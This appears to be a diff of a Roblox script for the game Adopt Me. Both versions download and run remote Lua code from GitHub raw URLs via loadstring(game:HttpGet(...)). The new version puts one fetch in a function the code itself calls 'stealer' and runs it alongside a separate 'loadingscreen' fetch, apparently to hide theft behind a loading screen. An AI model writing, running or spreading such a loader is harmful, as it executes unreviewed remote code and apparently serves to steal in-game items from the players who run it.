@@ -1,2 +1,10 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/AdoptMe-Script/refs/heads/main/New-Script"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/11"))()
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/AdoptMe-Script/refs/heads/main/New-Script", true))()
+end
+
+local function loadingscreen()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/11"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadingscreen)
